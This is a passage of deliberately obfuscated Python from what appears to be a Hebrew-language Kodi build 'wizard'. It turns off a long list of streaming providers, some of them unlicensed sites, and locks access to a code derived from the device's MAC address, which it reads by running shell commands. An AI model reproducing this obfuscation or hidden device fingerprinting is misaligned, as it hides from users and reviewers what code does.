		O00000O0000O0OO0O .setSetting ('provider.netzkino','false')#line:1948
		O00000O0000O0OO0O .setSetting ('provider.odb','false')#line:1949
		O00000O0000O0OO0O .setSetting ('provider.openkatalog','false')#line:1950
		O00000O0000O0OO0O .setSetting ('provider.ororo','false')#line:1951
		O00000O0000O0OO0O .setSetting ('provider.paczamy','false')#line:1952
		O00000O0000O0OO0O .setSetting ('provider.peliculasdk','false')#line:1953
		O00000O0000O0OO0O .setSetting ('provider.pelisplustv','false')#line:1954
		O00000O0000O0OO0O .setSetting ('provider.pepecine','false')#line:1955
		O00000O0000O0OO0O .setSetting ('provider.primewire','false')#line:1956
		O00000O0000O0OO0O .setSetting ('provider.projectfreetv','false')#line:1957
		O00000O0000O0OO0O .setSetting ('provider.proxer','false')#line:1958
		O00000O0000O0OO0O .setSetting ('provider.pureanime','false')#line:1959
		O00000O0000O0OO0O .setSetting ('provider.putlocker','false')#line:1960
		O00000O0000O0OO0O .setSetting ('provider.putlockerfree','false')#line:1961
		O00000O0000O0OO0O .setSetting ('provider.reddit','false')#line:1962
		O00000O0000O0OO0O .setSetting ('provider.cartoonwire','false')#line:1963
		O00000O0000O0OO0O .setSetting ('provider.seehd','false')#line:1964
		O00000O0000O0OO0O .setSetting ('provider.segos','false')#line:1965
		O00000O0000O0OO0O .setSetting ('provider.serienstream','false')#line:1966
		O00000O0000O0OO0O .setSetting ('provider.series9','false')#line:1967
		O00000O0000O0OO0O .setSetting ('provider.seriesever','false')#line:1968
		O00000O0000O0OO0O .setSetting ('provider.seriesonline','false')#line:1969
		O00000O0000O0OO0O .setSetting ('provider.seriespapaya','false')#line:1970
		O00000O0000O0OO0O .setSetting ('provider.sezonlukdizi','false')#line:1971
		O00000O0000O0OO0O .setSetting ('provider.solarmovie','false')#line:1972
		O00000O0000O0OO0O .setSetting ('provider.solarmoviez','false')#line:1973
		O00000O0000O0OO0O .setSetting ('provider.stream-to','false')#line:1974
		O00000O0000O0OO0O .setSetting ('provider.streamdream','false')#line:1975
		O00000O0000O0OO0O .setSetting ('provider.streamflix','false')#line:1976
		O00000O0000O0OO0O .setSetting ('provider.streamit','false')#line:1977
		O00000O0000O0OO0O .setSetting ('provider.swatchseries','false')#line:1978
		O00000O0000O0OO0O .setSetting ('provider.szukajkatv','false')#line:1979
		O00000O0000O0OO0O .setSetting ('provider.tainiesonline','false')#line:1980
		O00000O0000O0OO0O .setSetting ('provider.tainiomania','false')#line:1981
		O00000O0000O0OO0O .setSetting ('provider.tata','false')#line:1984
		O00000O0000O0OO0O .setSetting ('provider.trt','false')#line:1985
		O00000O0000O0OO0O .setSetting ('provider.tvbox','false')#line:1986
		O00000O0000O0OO0O .setSetting ('provider.ultrahd','false')#line:1987
		O00000O0000O0OO0O .setSetting ('provider.video4k','false')#line:1988
		O00000O0000O0OO0O .setSetting ('provider.vidics','false')#line:1989
		O00000O0000O0OO0O .setSetting ('provider.view4u','false')#line:1990
		O00000O0000O0OO0O .setSetting ('provider.watchseries','false')#line:1991
		O00000O0000O0OO0O .setSetting ('provider.xrysoi','false')#line:1992
		O00000O0000O0OO0O .setSetting ('provider.library','false')#line:1993
def fixfont ():#line:1996
	O00OOOOO000OOO000 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1997
	OO0OOO000O000OO0O =json .loads (O00OOOOO000OOO000 );#line:1999
	OOO000O0OO00O0O00 =OO0OOO000O000OO0O ["result"]["settings"]#line:2000
	OO0O0000OOOOO00O0 =[O0OOOO0OO0O0OOOOO for O0OOOO0OO0O0OOOOO in OOO000O0OO00O0O00 if O0OOOO0OO0O0OOOOO ["id"]=="audiooutput.audiodevice"][0 ]#line:2002
	OO0000O00OO00O0OO =OO0O0000OOOOO00O0 ["options"];#line:2003
	OO0O00000O0O0O0O0 =OO0O0000OOOOO00O0 ["value"];#line:2004
	O00000O0OOO00O0O0 =[O00OO000O0000OOOO for (O00OO000O0000OOOO ,O000OO00OO0OOO0O0 )in enumerate (OO0000O00OO00O0OO )if O000OO00OO0OOO0O0 ["value"]==OO0O00000O0O0O0O0 ][0 ];#line:2006
	OOO0000O000OO0O0O =(O00000O0OOO00O0O0 +1 )%len (OO0000O00OO00O0OO )#line:2008
	OOOOOO0000000OO00 =OO0000O00OO00O0OO [OOO0000O000OO0O0O ]["value"]#line:2010
	OO000000OO00OOOO0 =OO0000O00OO00O0OO [OOO0000O000OO0O0O ]["label"]#line:2011
	OOOO00O0O0000OO0O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:2013
	try :#line:2015
		OO000OOO0OO000O0O =json .loads (OOOO00O0O0000OO0O );#line:2016
		if OO000OOO0OO000O0O ["result"]!=True :#line:2018
			raise Exception #line:2019
	except :#line:2020
		sys .stderr .write ("Error switching audio output device")#line:2021
		raise Exception #line:2022
def parseDOM2 (OO000OO00OOO000OO ,name =u"",attrs ={},ret =False ):#line:2023
	if isinstance (OO000OO00OOO000OO ,str ):#line:2026
		try :#line:2027
			OO000OO00OOO000OO =[OO000OO00OOO000OO .decode ("utf-8")]#line:2028
		except :#line:2029
			OO000OO00OOO000OO =[OO000OO00OOO000OO ]#line:2030
	elif isinstance (OO000OO00OOO000OO ,unicode ):#line:2031
		OO000OO00OOO000OO =[OO000OO00OOO000OO ]#line:2032
	elif not isinstance (OO000OO00OOO000OO ,list ):#line:2033
		return u""#line:2034
	if not name .strip ():#line:2036
		return u""#line:2037
	OO0O0OO00O000000O =[]#line:2039
	for OOO00OOO0OOOOO0O0 in OO000OO00OOO000OO :#line:2040
		O0O00OOOO00O0O00O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOO00OOO0OOOOO0O0 )#line:2041
		for OO0O0O00O0OO00OOO in O0O00OOOO00O0O00O :#line:2042
			OOO00OOO0OOOOO0O0 =OOO00OOO0OOOOO0O0 .replace (OO0O0O00O0OO00OOO ,OO0O0O00O0OO00OOO .replace ("\n"," "))#line:2043
		O000OOO0O0OOOOO0O =[]#line:2045
		for O0OO000OO0O0OOO0O in attrs :#line:2046
			OOO00O00O0OO00O0O =re .compile ('(<'+name +'[^>]*?(?:'+O0OO000OO0O0OOO0O +'=[\'"]'+attrs [O0OO000OO0O0OOO0O ]+'[\'"].*?>))',re .M |re .S ).findall (OOO00OOO0OOOOO0O0 )#line:2047
			if len (OOO00O00O0OO00O0O )==0 and attrs [O0OO000OO0O0OOO0O ].find (" ")==-1 :#line:2048
				OOO00O00O0OO00O0O =re .compile ('(<'+name +'[^>]*?(?:'+O0OO000OO0O0OOO0O +'='+attrs [O0OO000OO0O0OOO0O ]+'.*?>))',re .M |re .S ).findall (OOO00OOO0OOOOO0O0 )#line:2049
			if len (O000OOO0O0OOOOO0O )==0 :#line:2051
				O000OOO0O0OOOOO0O =OOO00O00O0OO00O0O #line:2052
				OOO00O00O0OO00O0O =[]#line:2053
			else :#line:2054
				O000OOOO0000O000O =range (len (O000OOO0O0OOOOO0O ))#line:2055
				O000OOOO0000O000O .reverse ()#line:2056
				for OOO0OOO0O0O00O0O0 in O000OOOO0000O000O :#line:2057
					if not O000OOO0O0OOOOO0O [OOO0OOO0O0O00O0O0 ]in OOO00O00O0OO00O0O :#line:2058
						del (O000OOO0O0OOOOO0O [OOO0OOO0O0O00O0O0 ])#line:2059
		if len (O000OOO0O0OOOOO0O )==0 and attrs =={}:#line:2061
			O000OOO0O0OOOOO0O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOO00OOO0OOOOO0O0 )#line:2062
			if len (O000OOO0O0OOOOO0O )==0 :#line:2063
				O000OOO0O0OOOOO0O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOO00OOO0OOOOO0O0 )#line:2064
		if isinstance (ret ,str ):#line:2066
			OOO00O00O0OO00O0O =[]#line:2067
			for OO0O0O00O0OO00OOO in O000OOO0O0OOOOO0O :#line:2068
				OOOO0O0OO00O00O0O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO0O0O00O0OO00OOO )#line:2069
				if len (OOOO0O0OO00O00O0O )==0 :#line:2070
					OOOO0O0OO00O00O0O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO0O0O00O0OO00OOO )#line:2071
				for OOO0000O0OOOOOO00 in OOOO0O0OO00O00O0O :#line:2072
					OO0O0O00OO00O00O0 =OOO0000O0OOOOOO00 [0 ]#line:2073
					if OO0O0O00OO00O00O0 in "'\"":#line:2074
						if OOO0000O0OOOOOO00 .find ('='+OO0O0O00OO00O00O0 ,OOO0000O0OOOOOO00 .find (OO0O0O00OO00O00O0 ,1 ))>-1 :#line:2075
							OOO0000O0OOOOOO00 =OOO0000O0OOOOOO00 [:OOO0000O0OOOOOO00 .find ('='+OO0O0O00OO00O00O0 ,OOO0000O0OOOOOO00 .find (OO0O0O00OO00O00O0 ,1 ))]#line:2076
						if OOO0000O0OOOOOO00 .rfind (OO0O0O00OO00O00O0 ,1 )>-1 :#line:2078
							OOO0000O0OOOOOO00 =OOO0000O0OOOOOO00 [1 :OOO0000O0OOOOOO00 .rfind (OO0O0O00OO00O00O0 )]#line:2079
					else :#line:2080
						if OOO0000O0OOOOOO00 .find (" ")>0 :#line:2081
							OOO0000O0OOOOOO00 =OOO0000O0OOOOOO00 [:OOO0000O0OOOOOO00 .find (" ")]#line:2082
						elif OOO0000O0OOOOOO00 .find ("/")>0 :#line:2083
							OOO0000O0OOOOOO00 =OOO0000O0OOOOOO00 [:OOO0000O0OOOOOO00 .find ("/")]#line:2084
						elif OOO0000O0OOOOOO00 .find (">")>0 :#line:2085
							OOO0000O0OOOOOO00 =OOO0000O0OOOOOO00 [:OOO0000O0OOOOOO00 .find (">")]#line:2086
					OOO00O00O0OO00O0O .append (OOO0000O0OOOOOO00 .strip ())#line:2088
			O000OOO0O0OOOOO0O =OOO00O00O0OO00O0O #line:2089
		else :#line:2090
			OOO00O00O0OO00O0O =[]#line:2091
			for OO0O0O00O0OO00OOO in O000OOO0O0OOOOO0O :#line:2092
				O00O00000OO00O00O =u"</"+name #line:2093
				O0OO0O00OOOOO0O00 =OOO00OOO0OOOOO0O0 .find (OO0O0O00O0OO00OOO )#line:2095
				OOOO00O0O0O0O00O0 =OOO00OOO0OOOOO0O0 .find (O00O00000OO00O00O ,O0OO0O00OOOOO0O00 )#line:2096
				OOOO0O0OO00000OOO =OOO00OOO0OOOOO0O0 .find ("<"+name ,O0OO0O00OOOOO0O00 +1 )#line:2097
				while OOOO0O0OO00000OOO <OOOO00O0O0O0O00O0 and OOOO0O0OO00000OOO !=-1 :#line:2099
					O00O000OOO00OOOOO =OOO00OOO0OOOOO0O0 .find (O00O00000OO00O00O ,OOOO00O0O0O0O00O0 +len (O00O00000OO00O00O ))#line:2100
					if O00O000OOO00OOOOO !=-1 :#line:2101
						OOOO00O0O0O0O00O0 =O00O000OOO00OOOOO #line:2102
					OOOO0O0OO00000OOO =OOO00OOO0OOOOO0O0 .find ("<"+name ,OOOO0O0OO00000OOO +1 )#line:2103
				if O0OO0O00OOOOO0O00 ==-1 and OOOO00O0O0O0O00O0 ==-1 :#line:2105
					OOO0OOOOOO0OOOOOO =u""#line:2106
				elif O0OO0O00OOOOO0O00 >-1 and OOOO00O0O0O0O00O0 >-1 :#line:2107
					OOO0OOOOOO0OOOOOO =OOO00OOO0OOOOO0O0 [O0OO0O00OOOOO0O00 +len (OO0O0O00O0OO00OOO ):OOOO00O0O0O0O00O0 ]#line:2108
				elif OOOO00O0O0O0O00O0 >-1 :#line:2109
					OOO0OOOOOO0OOOOOO =OOO00OOO0OOOOO0O0 [:OOOO00O0O0O0O00O0 ]#line:2110
				elif O0OO0O00OOOOO0O00 >-1 :#line:2111
					OOO0OOOOOO0OOOOOO =OOO00OOO0OOOOO0O0 [O0OO0O00OOOOO0O00 +len (OO0O0O00O0OO00OOO ):]#line:2112
				if ret :#line:2114
					O00O00000OO00O00O =OOO00OOO0OOOOO0O0 [OOOO00O0O0O0O00O0 :OOO00OOO0OOOOO0O0 .find (">",OOO00OOO0OOOOO0O0 .find (O00O00000OO00O00O ))+1 ]#line:2115
					OOO0OOOOOO0OOOOOO =OO0O0O00O0OO00OOO +OOO0OOOOOO0OOOOOO +O00O00000OO00O00O #line:2116
				OOO00OOO0OOOOO0O0 =OOO00OOO0OOOOO0O0 [OOO00OOO0OOOOO0O0 .find (OOO0OOOOOO0OOOOOO ,OOO00OOO0OOOOO0O0 .find (OO0O0O00O0OO00OOO ))+len (OOO0OOOOOO0OOOOOO ):]#line:2118
				OOO00O00O0OO00O0O .append (OOO0OOOOOO0OOOOOO )#line:2119
			O000OOO0O0OOOOO0O =OOO00O00O0OO00O0O #line:2120
		OO0O0OO00O000000O +=O000OOO0O0OOOOO0O #line:2121
	return OO0O0OO00O000000O #line:2123
def addItem (OO00OOO000O0OO000 ,OO000OO0O0OOO0OOO ,OO00O0OOO0O0O0OOO ,OO000O00OO00O0O00 ,OOOO0O000O00OOO0O ,description =None ):#line:2125
	if description ==None :description =''#line:2126
	description ='[COLOR white]'+description +'[/COLOR]'#line:2127
	OOO000O0000OO00O0 =sys .argv [0 ]+"?url="+urllib .quote_plus (OO000OO0O0OOO0OOO )+"&mode="+str (OO00O0OOO0O0O0OOO )+"&name="+urllib .quote_plus (OO00OOO000O0OO000 )+"&iconimage="+urllib .quote_plus (OO000O00OO00O0O00 )+"&fanart="+urllib .quote_plus (OOOO0O000O00OOO0O )#line:2128
	OOOO00OOOO0O0000O =True #line:2129
	O0O0O00OO0OO0O0O0 =xbmcgui .ListItem (OO00OOO000O0OO000 ,iconImage =OO000O00OO00O0O00 ,thumbnailImage =OO000O00OO00O0O00 )#line:2130
	O0O0O00OO0OO0O0O0 .setInfo (type ="Video",infoLabels ={"Title":OO00OOO000O0OO000 ,"Plot":description })#line:2131
	O0O0O00OO0OO0O0O0 .setProperty ("fanart_Image",OOOO0O000O00OOO0O )#line:2132
	O0O0O00OO0OO0O0O0 .setProperty ("icon_Image",OO000O00OO00O0O00 )#line:2133
	OOOO00OOOO0O0000O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO000O0000OO00O0 ,listitem =O0O0O00OO0OO0O0O0 ,isFolder =False )#line:2134
	return OOOO00OOOO0O0000O #line:2135
def get_params ():#line:2137
		O0O00O00O0OO0OOO0 =[]#line:2138
		OO00O00OO00O00OOO =sys .argv [2 ]#line:2139
		if len (OO00O00OO00O00OOO )>=2 :#line:2140
				OO0O0000OOOO0OOOO =sys .argv [2 ]#line:2141
				O0O00000O0OO0OOOO =OO0O0000OOOO0OOOO .replace ('?','')#line:2142
				if (OO0O0000OOOO0OOOO [len (OO0O0000OOOO0OOOO )-1 ]=='/'):#line:2143
						OO0O0000OOOO0OOOO =OO0O0000OOOO0OOOO [0 :len (OO0O0000OOOO0OOOO )-2 ]#line:2144
				O0000O0OO00OOOOO0 =O0O00000O0OO0OOOO .split ('&')#line:2145
				O0O00O00O0OO0OOO0 ={}#line:2146
				for OOO0O0O000OO0O00O in range (len (O0000O0OO00OOOOO0 )):#line:2147
						O000O0O00O0OOOO00 ={}#line:2148
						O000O0O00O0OOOO00 =O0000O0OO00OOOOO0 [OOO0O0O000OO0O00O ].split ('=')#line:2149
						if (len (O000O0O00O0OOOO00 ))==2 :#line:2150
								O0O00O00O0OO0OOO0 [O000O0O00O0OOOO00 [0 ]]=O000O0O00O0OOOO00 [1 ]#line:2151
		return O0O00O00O0OO0OOO0 #line:2153
def decode (OO00O0O00OO0000O0 ,O0O0OO0OOO0OO00O0 ):#line:2158
    import base64 #line:2159
    OO0OOO0O00OO00OO0 =[]#line:2160
    if (len (OO00O0O00OO0000O0 ))!=4 :#line:2162
     return 10 #line:2163
    O0O0OO0OOO0OO00O0 =base64 .urlsafe_b64decode (O0O0OO0OOO0OO00O0 )#line:2164
    for OOO000O000O0000O0 in range (len (O0O0OO0OOO0OO00O0 )):#line:2166
        OO0O0OOO00OO00O0O =OO00O0O00OO0000O0 [OOO000O000O0000O0 %len (OO00O0O00OO0000O0 )]#line:2167
        O0000O0O00O000O0O =chr ((256 +ord (O0O0OO0OOO0OO00O0 [OOO000O000O0000O0 ])-ord (OO0O0OOO00OO00O0O ))%256 )#line:2168
        OO0OOO0O00OO00OO0 .append (O0000O0O00O000O0O )#line:2169
    return "".join (OO0OOO0O00OO00OO0 )#line:2170
def tmdb_list (OO0OO0OO0O0OOOO0O ):#line:2171
    OOO000O0OO0O00O00 =decode ("7643",OO0OO0OO0O0OOOO0O )#line:2174
    return int (OOO000O0OO0O00O00 )#line:2177
def u_list (OO00OO0OO0OOOOOOO ):#line:2178
   try :#line:2179
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:2180
        from math import sqrt #line:2181
        O0O0O0OOOO00O00O0 =tmdb_list (TMDB_NEW_API )#line:2182
        O0OOO00OOO0O000OO =str ((getHwAddr ('eth0'))*O0O0O0OOOO00O00O0 )#line:2184
        OO0O0O00000OOOO00 =int (O0OOO00OOO0O000OO [1 ]+O0OOO00OOO0O000OO [2 ]+O0OOO00OOO0O000OO [5 ]+O0OOO00OOO0O000OO [7 ])#line:2185
        O0OO0OOO0O000OO00 =(ADDON .getSetting ("pass"))#line:2187
        OOOOOO0O0000O0OO0 =(str (round (sqrt ((OO0O0O00000OOOO00 *500 )+30 )+30 ,4 ))[-4 :]).replace ('.','')#line:2192
        if '.'in OOOOOO0O0000O0OO0 :#line:2194
         OOOOOO0O0000O0OO0 =(str (round (sqrt ((OO0O0O00000OOOO00 *500 )+30 )+30 ,4 ))[-5 :]).replace ('.','')#line:2195
        if O0OO0OOO0O000OO00 ==OOOOOO0O0000O0OO0 :#line:2197
          O0000OOO0OOO0O0OO =OO00OO0OO0OOOOOOO #line:2199
        else :#line:2201
           if STARTP2 ()and STARTP ()=='ok':#line:2202
             return OO00OO0OO0OOOOOOO #line:2205
           O0000OOO0OOO0O0OO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:2206
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:2207
           sys .exit ()#line:2208
        return O0000OOO0OOO0O0OO #line:2209
    else :#line:2210
        STARTP ()#line:2211
   except :#line:2213
           if STARTP2 ()and STARTP ()=='ok':#line:2214
             return OO00OO0OO0OOOOOOO #line:2217
           O0000OOO0OOO0O0OO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:2218
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:2219
           sys .exit ()#line:2220
def disply_hwr ():#line:2223
   try :#line:2224
    OOO000OOO0O000OO0 =tmdb_list (TMDB_NEW_API )#line:2225
    O0O00O0O0O0O00000 =str ((getHwAddr ('eth0'))*OOO000OOO0O000OO0 )#line:2226
    OOOO000OOO0OO0000 =(O0O00O0O0O0O00000 [1 ]+O0O00O0O0O0O00000 [2 ]+O0O00O0O0O0O00000 [5 ]+O0O00O0O0O0O00000 [7 ])#line:2233
    OOO0OOOOOO0000000 =(ADDON .getSetting ("action"))#line:2234
    wiz .setS ('action',str (OOOO000OOO0OO0000 ))#line:2236
   except :pass #line:2237
def disply_hwr2 ():#line:2238
   try :#line:2239
    OO00OO00OOO00O000 =tmdb_list (TMDB_NEW_API )#line:2240
    O0OOO000OOO0O00O0 =str ((getHwAddr ('eth0'))*OO00OO00OOO00O000 )#line:2242
    O0000OO0O00OO00OO =(O0OOO000OOO0O00O0 [1 ]+O0OOO000OOO0O00O0 [2 ]+O0OOO000OOO0O00O0 [5 ]+O0OOO000OOO0O00O0 [7 ])#line:2251
    OO0O0O00OOOO0OOOO =(ADDON .getSetting ("action"))#line:2252
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0000OO0O00OO00OO )#line:2255
   except :pass #line:2256
def getHwAddr (OO00000OOOOO00000 ):#line:2258
   import subprocess ,time #line:2259
   O0000O000O0O00O0O ='windows'#line:2260
   if xbmc .getCondVisibility ('system.platform.android'):#line:2261
       O0000O000O0O00O0O ='android'#line:2262
   if xbmc .getCondVisibility ('system.platform.android'):#line:2263
     O0OOOO00O0000000O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:2264
     O00O00OO00OO0O0OO =re .compile ('link/ether (.+?) brd').findall (str (O0OOOO00O0000000O ))#line:2266
     O000OO0OOO00O000O =0 #line:2267
     for O000OO0O0OO00O000 in O00O00OO00OO0O0OO :#line:2268
      if O00O00OO00OO0O0OO !='00:00:00:00:00:00':#line:2269
          OOOOO0O000O000OO0 =O000OO0O0OO00O000 #line:2270
          O000OO0OOO00O000O =O000OO0OOO00O000O +int (OOOOO0O000O000OO0 .replace (':',''),16 )#line:2271
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:2273
       OOO0OOO00OO00OOO0 =0 #line:2274
       O000OO0OOO00O000O =0 #line:2275
       O0O0OOOOOO0OOOO00 =[]#line:2276
       OO00O0OO00OOOOOOO =os .popen ("getmac").read ()#line:2277
       OO00O0OO00OOOOOOO =OO00O0OO00OOOOOOO .split ("\n")#line:2278
       for O000OOOOOOOOO00O0 in OO00O0OO00OOOOOOO :#line:2280
            O0OO0OOO00O0OOO00 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O000OOOOOOOOO00O0 ,re .I )#line:2281
            if O0OO0OOO00O0OOO00 :#line:2282
                O00O00OO00OO0O0OO =O0OO0OOO00O0OOO00 .group ().replace ('-',':')#line:2283
                O0O0OOOOOO0OOOO00 .append (O00O00OO00OO0O0OO )#line:2284
                O000OO0OOO00O000O =O000OO0OOO00O000O +int (O00O00OO00OO0O0OO .replace (':',''),16 )#line:2287
   else :#line:2289
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:2290
   try :#line:2307
    return O000OO0OOO00O000O #line:2308
   except :pass #line:2309
def getpass ():#line:2310
	disply_hwr2 ()#line:2312
def setpass ():#line:2313
    OOO0OOO00OO00O000 =xbmcgui .Dialog ()#line:2314
    OO0OOOOOO0O0O0OOO =''#line:2315
    OOOO0O0O0O0OOO0O0 =xbmc .Keyboard (OO0OOOOOO0O0O0OOO ,'הכנס סיסמה')#line:2317
    OOOO0O0O0O0OOO0O0 .doModal ()#line:2318
    if OOOO0O0O0O0OOO0O0 .isConfirmed ():#line:2319
           OOOO0O0O0O0OOO0O0 =OOOO0O0O0O0OOO0O0 .getText ()#line:2320
    wiz .setS ('pass',str (OOOO0O0O0O0OOO0O0 ))#line:2321
def setuname ():#line:2322
    O00O0000O000O0OOO =''#line:2323
    OOOO0000OO00000O0 =xbmc .Keyboard (O00O0000O000O0OOO ,'הכנס שם משתמש')#line:2324
    OOOO0000OO00000O0 .doModal ()#line:2325
    if OOOO0000OO00000O0 .isConfirmed ():#line:2326
           O00O0000O000O0OOO =OOOO0000OO00000O0 .getText ()#line:2327
           wiz .setS ('user',str (O00O0000O000O0OOO ))#line:2328
def powerkodi ():#line:2329
    os ._exit (1 )#line:2330
def buffer1 ():#line:2332
	O00O00O0O00O00OOO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:2333
	O00O0O0OO0O0O0O00 =xbmc .getInfoLabel ("System.Memory(total)")#line:2334
	OOOOO0OO00000O0OO =xbmc .getInfoLabel ("System.FreeMemory")#line:2335
	OO0000O00O0O0O0O0 =re .sub ('[^0-9]','',OOOOO0OO00000O0OO )#line:2336
	OO0000O00O0O0O0O0 =int (OO0000O00O0O0O0O0 )/3 #line:2337
	O0OOOO00O00O0000O =OO0000O00O0O0O0O0 *1024 *1024 #line:2338
	try :O0O00O00OOO0O00O0 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2339
	except :O0O00O00OOO0O00O0 =16 #line:2340
	OOO000OOO000O0000 =DIALOG .yesno ('FREE MEMORY: '+str (OOOOO0OO00000O0OO ),'Based on your free Memory your optimal buffersize is: '+str (OO0000O00O0O0O0O0 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:2343
	if OOO000OOO000O0000 ==1 :#line:2344
		with open (O00O00O0O00O00OOO ,"w")as O0O0O0O000O0O000O :#line:2345
			if O0O00O00OOO0O00O0 >=17 :OO0O00O00O00OOOOO =xml_data_advSettings_New (str (O0OOOO00O00O0000O ))#line:2346
			else :OO0O00O00O00OOOOO =xml_data_advSettings_old (str (O0OOOO00O00O0000O ))#line:2347
			O0O0O0O000O0O000O .write (OO0O00O00O00OOOOO )#line:2349
			DIALOG .ok ('Buffer Size Set to: '+str (O0OOOO00O00O0000O ),'Please restart Kodi for settings to apply.','')#line:2350
	elif OOO000OOO000O0000 ==0 :#line:2352
		O0OOOO00O00O0000O =_O0O0OO00OO0OO0OOO (default =str (O0OOOO00O00O0000O ),heading ="INPUT BUFFER SIZE")#line:2353
		with open (O00O00O0O00O00OOO ,"w")as O0O0O0O000O0O000O :#line:2354
			if O0O00O00OOO0O00O0 >=17 :OO0O00O00O00OOOOO =xml_data_advSettings_New (str (O0OOOO00O00O0000O ))#line:2355
			else :OO0O00O00O00OOOOO =xml_data_advSettings_old (str (O0OOOO00O00O0000O ))#line:2356
			O0O0O0O000O0O000O .write (OO0O00O00O00OOOOO )#line:2357
			DIALOG .ok ('Buffer Size Set to: '+str (O0OOOO00O00O0000O ),'Please restart Kodi for settings to apply.','')#line:2358
def xml_data_advSettings_old (OO0OOOO0OO00O00O0 ):#line:2359
	OO0O0O00O000O00O0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0OOOO0OO00O00O0 #line:2369
	return OO0O0O00O000O00O0 #line:2370
def xml_data_advSettings_New (OO0OO0O00OO000O00 ):#line:2372
	OO0O0OOO0OOOOOO00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO0OO0O00OO000O00 #line:2384
	return OO0O0OOO0OOOOOO00 #line:2385
def write_ADV_SETTINGS_XML (OO0OO00OOO0OOOO0O ):#line:2386
    if not os .path .exists (xml_file ):#line:2387
        with open (xml_file ,"w")as OOOOO0OO0O0O0OOO0 :#line:2388
            OOOOO0OO0O0O0OOO0 .write (xml_data )#line:2389
def _O0O0OO00OO0OO0OOO (default ="",heading ="",hidden =False ):#line:2390
    ""#line:2391
    O00O0OO000O0OO0OO =xbmc .Keyboard (default ,heading ,hidden )#line:2392
    O00O0OO000O0OO0OO .doModal ()#line:2393
    if (O00O0OO000O0OO0OO .isConfirmed ()):#line:2394
        return unicode (O00O0OO000O0OO0OO .getText (),"utf-8")#line:2395
    return default #line:2396
def index ():#line:2398
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2399
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2400
	if AUTOUPDATE =='Yes':#line:2401
		if wiz .workingURL (WIZARDFILE )==True :#line:2402
			O0OO000O00O0O0OO0 =wiz .checkWizard ('version')#line:2403
			if O0OO000O00O0O0OO0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0OO000O00O0O0OO0 ),'wizardupdate',themeit =THEME2 )#line:2404
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2405
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2406
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2407
	if len (BUILDNAME )>0 :#line:2408
		OOOO00O00O00O0OO0 =wiz .checkBuild (BUILDNAME ,'version')#line:2409
		OOOO00O0O0000O00O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2410
		if OOOO00O00O00O0OO0 >BUILDVERSION :OOOO00O0O0000O00O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OOOO00O0O0000O00O ,OOOO00O00O00O0OO0 )#line:2411
		addDir (OOOO00O0O0000O00O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2413
		try :#line:2415
		     OO000OO0OOOOO00O0 =wiz .themeCount (BUILDNAME )#line:2416
		except :#line:2417
		   OO000OO0OOOOO00O0 =False #line:2418
		if not OO000OO0OOOOO00O0 ==False :#line:2419
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2420
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2421
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2424
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2425
